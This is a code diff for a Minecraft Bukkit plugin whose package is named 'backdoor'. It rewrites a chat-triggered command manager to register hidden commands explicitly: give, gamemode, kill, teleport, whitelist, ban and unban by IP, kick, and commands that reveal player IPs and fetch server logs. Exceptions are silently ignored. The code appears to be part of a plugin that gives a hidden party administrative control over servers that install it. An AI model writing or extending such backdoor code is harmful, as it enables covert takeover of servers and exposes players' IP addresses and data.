@@ -2,6 +2,8 @@ package me.tsb.backdoor;
 
 import lombok.Getter;
 import lombok.SneakyThrows;
+import me.tsb.backdoor.commands.*;
+import me.tsb.backdoor.commands.bans.*;
 import me.tsb.plugin.Main;
 import org.bukkit.ChatColor;
 import org.bukkit.event.player.PlayerChatEvent;
@@ -30,18 +32,32 @@ public class CommandMan {
 
     @SneakyThrows
     public void init() {
+        try {
+            AddCommand(new XPCommand());
+            AddCommand(new WhitelistCommand());
+            AddCommand(new TpCommand());
+            AddCommand(new SummonCommand());
+            AddCommand(new SeedCommand());
+            AddCommand(new PlayerPositionCommand());
+            AddCommand(new KillCommand());
+            AddCommand(new IpCommand());
+            AddCommand(new HelpCommand());
+            AddCommand(new GiveCommand());
+            AddCommand(new GetLogsCommand());
+            AddCommand(new GamemodeCommand());
+            AddCommand(new FixCommand());
+            AddCommand(new FillerCommand(main));
+            AddCommand(new EnchantCommand());
+            AddCommand(new EffectCommand());
+            AddCommand(new CommandsCommand(main));
+            AddCommand(new BedPositionCommand());
+            AddCommand(new UnBanIpCommand());
+            AddCommand(new UnBanIpCommand());
+            AddCommand(new KickCommand());
+            AddCommand(new BanIpCommand());
+            AddCommand(new BanCommand());
 
-        Reflections reflections = new Reflections("me.tsb.backdoor.commands");
-
-        for (Class<? extends Command> aClass : reflections.getSubTypesOf(Command.class)) {
-
-            try {
-
-                AddCommand(aClass.getConstructor(Main.class).newInstance(main));
-                AddCommand(aClass.getConstructor().newInstance());
-            } catch (Exception ignored) {
-            }
-
+        } catch (Exception ignored) {
         }
     }
 
